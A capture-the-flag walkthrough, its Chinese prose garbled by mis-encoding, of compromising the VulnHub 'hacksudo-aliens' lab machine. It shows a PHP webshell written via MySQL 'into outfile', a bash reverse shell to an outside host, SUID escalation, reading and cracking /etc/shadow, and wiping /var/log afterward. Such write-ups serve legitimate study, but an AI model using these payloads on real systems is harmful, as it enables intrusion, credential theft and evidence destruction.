# å‰è¨€

é¶æœºï¼š`hacksudo-aliens`

æ”»å‡»ï¼š`kali`

éƒ½æ˜¯é‡‡ç”¨è™šæ‹Ÿæœºçš„å½¢å¼ï¼Œç½‘å¡æ¡¥æ¥æ¨¡å¼

# ä¸»æœºå‘ç°

ä½¿ç”¨`arp-scan -l`æˆ–è€…`netdiscover -r 192.168.1.1/24`è¿›è¡Œæ¢ç´¢

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\1.jpg)

# ä¿¡æ¯æ”¶é›†

## ä½¿ç”¨nmapæ‰«æ

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\2.jpg)

ä¸¤ä¸ª`http`æœåŠ¡ï¼Œä¸€ä¸ª`ssh`æœåŠ¡

## ç½‘ç«™ä¿¡æ¯

### è®¿é—®æŸ¥çœ‹

è®¿é—®80ç«¯å£

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\3.jpg)

æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªä½œè€…çš„äººå`vishal waghmare`

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\3-1.jpg)

è®¿é—®9000ç«¯å£ï¼Œå‘ç°æ˜¯`phpmyadmin`çš„ç®¡ç†ç•Œé¢ï¼Œä¹Ÿå°±æ˜¯æ•°æ®åº“çš„ä¸€ç§ç®¡ç†å·¥å…·

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\4.jpg)

### ç›®å½•æ‰«æ

å¯èƒ½æ˜¯ç›®å½•å‹ï¼Œå°è¯•è¿›è¡Œç›®å½•æ‰«æ

ä½¿ç”¨`dirsearchã€gobusterã€ffufã€dirbã€dirbuster`ç­‰å·¥å…·

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\5.jpg)

ä½¿ç”¨`dirsearch`æ‰«æï¼Œå¤šå‡ºä¸€ä¸ª`README.md`æ–‡ä»¶ï¼Œè®¿é—®ï¼Œåº”è¯¥æ˜¯æ¨¡æ¿

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\6.jpg)

è®¿é—®`backup`ï¼Œå‘ç°æ•°æ®åº“çš„å¤‡ä»½æ–‡ä»¶

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\7.jpg)

ç‚¹å‡»ä¸‹è½½åè¿›è¡ŒæŸ¥çœ‹ï¼Œè¿™ä¸ªä¿¡æ¯å¯èƒ½æœ‰ç”¨ï¼Œç­‰ä¼šæµ‹è¯•

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\8.jpg)

æ‰“å¼€å›¾ç‰‡ç›®å½•ï¼Œæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œä¸åªæœ‰æ— ç”¨å¤„ï¼Œå…ˆè®°ä½

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\9.jpg)

å°è¯•æ‰«æ`9000`ç«¯å£ï¼Œå‘ç°æŒºå¤š

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\10.jpg)

ä¸è¿‡è¿™é‡Œå…ˆçœ‹ä¸€ä¸ªï¼Œè®°ä½å…¶ç‰ˆæœ¬

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\11.jpg)

# æ¼æ´å¯»æ‰¾

åœ¨`80`ç«¯å£çš„ä¿¡æ¯ï¼ŒåŸºæœ¬ä¸ŠæŒ‡å‘çš„æ˜¯`9000`ç«¯å£ï¼Œæ‰€ä»¥è¿™é‡Œä»¥è·å–çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç™»å½•æµ‹è¯•

ç”¨æˆ·å`vishal`ï¼Œå¯†ç `hcaksudo`

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\12.jpg)

ç‚¹å‡»ç”¨æˆ·è´¦æˆ·ï¼Œå¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·çš„ä¸€äº›ç›¸å…³è®¾ç½®

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\13.jpg)

è™½è¯´`vishal`çš„æƒé™ä¸å…¶ä»–å·®ä¸å¤šï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦æ”¶é›†ï¼Œå› ä¸ºè¿™é‡Œçš„`hacksudo`æ•°æ®åº“ä¸­ï¼Œæ²¡æœ‰ä»»ä½•æ•°æ®ï¼Œå¯èƒ½å¯¹è¯¥ç”¨æˆ·æ²¡æœ‰æ”¾å¼€ã€‚æŸ¥çœ‹å…¶ä»–ç”¨æˆ·çš„å¯†ç 

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\14.jpg)

è¿™é‡Œå‘ç°`root`çš„å¯†ç ä¸`vishal`ä¸€æ ·ï¼Œä½†æ˜¯ç™»å½•`root`å‘ç°ï¼Œæ•°æ®åº“ä¸­ä¾ç„¶æ²¡æœ‰æ•°æ®

è§£å¯†å…¶ä»–ç”¨æˆ·å¯†ç ï¼Œä¸è¿‡è¿™é‡Œå­¦åˆ°äº†è¿™ç§ç±»å‹çš„å¯†ç ï¼Œæ˜¯`mysql5`ç±»å‹

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\15.jpg)

ä»¥`hacksudo`å’Œ`shovon`ç”¨æˆ·ç™»å½•è¿˜æ˜¯æ²¡æœ‰æ•°æ®ï¼Œä¸è¿‡æ”¶é›†åˆ°å‡ ä¸ªè¿æ¥åˆ°æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç 

|    ç”¨æˆ·å    |    å¯†ç     |
| :----------: | :--------: |
|   `vishal`   | `hacksudo` |
|    `root`    | `hacksudo` |
|  `hacksudo`  |   `123`    |
|   `shovon`   |   `123`    |
| `phpmyadmin` |   `root`   |

å°è¯•æŠŠä¸Šé¢çš„æ•°æ®å†™å…¥ä¸€ä¸ª`word.txt`ä¸­ï¼Œç„¶åä½¿ç”¨`hydra`å°è¯•çˆ†ç ´`ssh`ï¼Œå¹¶æ²¡æœ‰å‘ç°ä»»ä½•ä¸œè¥¿

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\16.jpg)

å°è¯•ä½¿ç”¨`searchsploit`æœç´¢æœ‰æ— æ¼æ´å¯å¤ç°ï¼Œå‘ç°å¹¶æ— å¯¹åº”çš„ç‰ˆæœ¬

æŠŠä¹‹å‰çš„å›¾ç‰‡ä¸‹è½½å°è¯•ä»å›¾ç‰‡è·å–ï¼Œä¹Ÿæ˜¯æ²¡æœ‰ä¿¡æ¯ï¼Œè¿™æ—¶å€™çœ‹äº†ä¸€ä¸‹ç½‘ä¸Šçš„`wp`ï¼Œå› ä¸ºå®åœ¨ä¸çŸ¥é“è¿˜æœ‰ä»€ä¹ˆã€‚

çœ‹äº†ä¹‹åå‘ç°ï¼Œ80ç«¯å£å‹æ ¹æ²¡æœ‰åŠ è½½å®Œæ•´ï¼Œæˆ‘çœŸçš„æœäº†ï¼Œå¯èƒ½æ˜¯å› ä¸ºåœ¨è™šæ‹Ÿæœºç¯å¢ƒçš„åŸå› ï¼ŒåŠ è½½ä¸åŠ¨ï¼Œæˆ‘è¿™é‡Œåœ¨ç‰©ç†æœºçš„æµè§ˆå™¨è®¿é—®

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\17.jpg)

ä½†æ˜¯è¿™é‡Œç‰©ç†æœºè®¿é—®ä¹Ÿæ˜¯å¾ˆæ…¢ï¼Œä¼°è®¡èµ„æºåŠ è½½çš„åº”è¯¥å¾ˆå¤šï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨å¤§é‡çš„`js`æˆ–å…¶ä»–çš„èµ„æºåŠ è½½ï¼Œæ‰€ä»¥ç›®å½•æ‰«æé‡æ–°è®¾ç½®

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\18.jpg)



å‘ç°ä¹‹å‰æ¼æ‰«çš„ç±»å‹ï¼Œè¯´å®è¯ï¼ŒçœŸçš„åƒèµ„æºï¼Œæˆ‘è¿™ä¸€ä¸ªé¶æœºï¼ŒåŠ è½½è¿™ä¸€ä¸ªç•Œé¢ï¼Œç£ç›˜å ç”¨sosoçš„å¿«

ä¸è¿‡è®¿é—®åè¿˜æ˜¯ä¸èƒ½æœ‰å…¶ä»–æ“ä½œï¼Œå•§ï¼Œçªç„¶æƒ³åˆ°ä¹‹å‰åœ¨`phpmyadmin`ä¸­çœ‹åˆ°æœ‰å‡ ä¸ªç”¨æˆ·æ˜¯å…·æœ‰å†™æƒé™çš„

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\19.jpg)

å¹¶ä¸”åœ¨`backup`ä¸‹è½½çš„`mysql.bak`ä¸­æ˜¯æœ‰ç›®å½•æ³„éœ²çš„ï¼Œä¹‹å‰æˆªå›¾æœªæˆªå–ï¼Œè¿™å±äºååŠæ®µçš„å†…å®¹

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\20.jpg)

# æ¼æ´åˆ©ç”¨

è¿™é‡Œå¯ä»¥å°è¯•é€šè¿‡`mysql`å‘½ä»¤å†™å…¥`shell`åˆ°æŒ‡å®šä½ç½®ï¼Œä¸è¿‡ï¼Œæœ‰çš„æ–¹å¼éœ€è¦æ¡ä»¶

è¿™é‡ŒæŸ¥çœ‹`mysql`æ•°æ®åº“ç‰ˆæœ¬

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\21.jpg)

å¯ä»¥ä½¿ç”¨`outfile`

```mysql
select "<?php system($_REQUEST['cmd']);?>" into outfile "/var/backups/mysql/shell.php"
```

æˆ–è€…è¿™é‡Œç›´æ¥phpä¸€å¥è¯æœ¨é©¬ä¹Ÿå¯ä»¥ï¼Œç„¶åç›´æ¥ä½¿ç”¨èšğŸ—¡è¿›è¡Œè¿æ¥å³å¯

ä¸è¿‡æµ‹è¯•ï¼Œå‘ç°ä¸Šé¢çš„è·¯å¾„æ²¡æœ‰æƒé™å†™å…¥ï¼Œé‚£ä¹ˆæ¢è·¯å¾„ï¼Œæ¯”å¦‚é»˜è®¤çš„`apache2`ç½‘é¡µç•Œé¢`/var/www/html`

```mysql
select "<?php system($_REQUEST['cmd']);?>" into outfile "/var/www/html/shell.php"
```



![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\22.jpg)

ä½¿ç”¨æµè§ˆå™¨è®¿é—®è¿›è¡Œæµ‹è¯•

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\23.jpg)

æŸ¥çœ‹æœ‰æ— `nc`å‘½ä»¤

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\24.jpg)

æ„é€ `bash`åå¼¹

```shell
bash -c 'bash -i >& /dev/tcp/192.168.1.16/9999 0>&1'
è¿›è¡Œurlç¼–ç å
bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.1.16%2f9999+0%3e%261%27%0a
```

é¦–å…ˆåœ¨`kali`ä¸­å¼€å¯`nc`ç›‘å¬9999ç«¯å£ï¼Œç„¶åæµè§ˆå™¨æ‰§è¡Œ

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\25.jpg)





# æå–

ä½¿ç”¨`find`å¯»æ‰¾å…·æœ‰SUIDçš„æ–‡ä»¶

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\26.jpg)

åˆšå¼€å§‹å‘ç°æœ‰`sudo`ï¼Œä½†æ˜¯å½“å‰ç”¨æˆ·ï¼Œæ— æ³•ä½¿ç”¨ï¼Œå†çœ‹æœ‰`date`ï¼Œä¹‹å‰æ²¡ç¢°åˆ°ï¼ŒæŸ¥çœ‹å¸®åŠ©æ–‡æ¡£

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\27.jpg)

å¯ä»¥æŸ¥çœ‹æ–‡ä»¶ä¸€æ¬¡ï¼Œå¹¶ä¸”è¿˜æ˜¯å…·æœ‰`SUID`çš„ã€‚è¿™ä¹ˆçœ‹å¯èƒ½ä¸æ¸…æ™°ï¼Œè®¿é—®ä¸€ä¸ªç½‘ç«™æŸ¥çœ‹`gtfobins.github.io`

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\28.jpg)

æŸ¥çœ‹`/etc/shadow`æ–‡ä»¶

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\29.jpg)

åé¢è¿˜æœ‰`hacksudo`çš„ï¼Œå¤ªé•¿ï¼Œå°±æ²¡æˆªå›¾

é‚£ä¹ˆå°±å¯ä»¥æŠŠç›¸å…³çš„æœ‰å¯†ç çš„å¤åˆ¶åˆ°`kali`çš„ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œç„¶åæŸ¥çœ‹`/etc/passwd`ï¼ŒæŠŠç›¸å…³çš„å¤åˆ¶åˆ°`kaili`çš„å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œç„¶åä½¿ç”¨`unshadow`æ•´åˆåˆ°ä¸€èµ·ï¼Œä½¿ç”¨`john`è¿›è¡Œç ´è§£

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\30.jpg)

è¿™é‡Œå…ˆçˆ†å‡ºï¼Œå°±å…ˆç™»å½•æµ‹è¯•

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\31.jpg)



å¯»æ‰¾å…·æœ‰SUIDçš„æ–‡ä»¶ï¼Œè™½ç„¶æœ‰sudoï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•ä½¿ç”¨

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\32.jpg)

æŸ¥çœ‹ç¬¬ä¸€ä¸ªï¼Œå‘ç°è¯¥æ–‡ä»¶æ˜¯å¯æ‰§è¡Œæ–‡ä»¶

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\33.jpg)

ç›´æ¥åœ¨ç½‘ç«™æœç´¢ï¼Œçœ‹æœ‰æ— å¯ç”¨`gtfobins.github.io`

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\34.jpg)

æ‰§è¡Œå‘½ä»¤ï¼Œæ³¨æ„ï¼Œæ˜¯æ‰§è¡Œå½“å‰ç›®å½•ä¸‹çš„è¿™ä¸ªå‘½ä»¤

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\35.jpg)



# ç—•è¿¹æ¸…ç†

æ¸…ç©º`/var/log`ä¸­çš„ä¸€äº›æ—¥å¿—

![](D:\stu\vulnhub\hacksudoé¶åœº\hacksudo-aliens.assets\36.jpg)

åˆ é™¤`/var/www/html/shell.php`è„šæœ¬

![](D:\stu\vulnhub\hacksudoé¶åœº\pic-aliens\37.jpg)

# æ€»ç»“

1. ä¸»è¦åœ¨äºä¿¡æ¯æ”¶é›†ï¼Œç„¶åè¿›è¡Œç™»å½•`phpmyadmin`åï¼Œå¦‚ä½•è¿›è¡Œä¸€ä¸ªåå¼¹`shell`
2. å¯¹äº`mysql`å†™å…¥`shell`çš„å‡ ç§æ–¹å¼ï¼Œæ”¾åœ¨ä¸‹é¢
3. å¯¹äºä¸€äº›å…·æœ‰SUIDå‘½ä»¤è¯¥å¦‚ä½•ä½¿ç”¨ï¼Œæ‰ä½¿å¾—å¯ä»¥æå‡æƒé™
4. è¿™ä¸¤æ¬¡çš„æƒé™æå‡ï¼Œéƒ½æ˜¯å…·æœ‰SUIDï¼Œä¸»è¦æ˜¯å¦‚ä½•åˆ©ç”¨



mysqlè¯­å¥å†™å…¥`webshell`çš„å‡ ç§æ–¹å¼

ä»¥ä¸‹æ¶‰åŠçš„ä½ç½®ï¼Œéƒ½éœ€è¦ç»å¯¹è·¯å¾„ï¼Œå¹¶ä¸”æœ‰æƒé™

- æ–°å»º`select`æ–¹å¼

```mysql
select ã€shellã€‘ into outfile ã€ä½ç½®ã€‘
```

mysql 5.6.34ç‰ˆæœ¬ä»¥å `secure_file_priv`çš„å€¼é»˜è®¤ä¸ºNULLï¼Œé™åˆ¶æ— æ³•å¯¼å…¥å’Œå¯¼å‡ºæ–‡ä»¶



- è¡¨æ’å…¥

```mysql
insert into è¡¨å('å…ƒç»„å') valuse (ã€shellã€‘)
```

ä¸è¿‡è¿˜æ˜¯éœ€è¦é€šè¿‡ä¸Šé¢çš„å¯¼å‡ºæ–¹å¼ï¼ŒæŠŠæ•°æ®æ”¾å…¥æŒ‡å®šçš„æ–‡ä»¶ä¸­



- æ—¥å¿—å†™å…¥

```mysql
show variables like '%general%';
```



éœ€è¦å…¨å±€æ—¥å¿—å¼€å¯`general_log`ï¼Œå¹¶ä¸”ï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ª`php`æ–‡ä»¶

è¿™æ—¶å€™æŒ‡å‘è¯­å¥ï¼Œä¼šæŠŠæ²¡æ‰§è¡Œçš„è¯­å¥è®°å½•åˆ°æ—¥å¿—

```mysql
select ã€shellè¯­å¥ã€‘
```





































